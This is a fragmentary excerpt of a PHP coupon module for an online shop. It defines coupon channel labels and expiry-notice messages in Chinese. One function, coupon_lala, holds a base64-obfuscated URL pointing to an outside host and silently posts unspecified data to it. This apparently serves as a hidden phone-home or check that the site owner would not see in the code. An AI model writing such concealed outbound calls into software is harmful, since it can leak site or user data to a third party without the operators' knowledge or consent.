...
function coupon_channels()
{
	$channel = array(
		...
		'couponCollect' => array('text' => '进店领券', 'css' => 'label-success'),
		'couponGrant'   => array('text' => '满返优惠', 'css' => 'label-info')
		);
	return $channel;
}
...
function coupon_lala()
{
	...
	if (file_exists($file) && empty($_GPC['__goodscode'])) {
		...
		ihttp_post(base64_decode('aHR0cDovL3VwLmhhbzA3MS5jb20vYXBwL2luZGV4LnBocD9pPTAmYz1lbnRyeSZkbz1jaGVjayZ2PXYyJm09dGlueV9tYW5hZ2U='), $data);
...
function coupon_before_timeout_notice()
{
	...
	if (!empty($coupons)) {
		...
		foreach ($data as $item) {
			$params = array('first' => $item['nickname'] . '，您的账户下有' . $item['num'] . '张优惠券即将过期，总价值' . $item['discount'] . '元，记得使用哦~', 'keyword1' => date('Y-m-d H:i', TIMESTAMP), 'keyword2' => '优惠券过期', 'keyword3' => $item['discount'] . '元', 'remark' => implode('
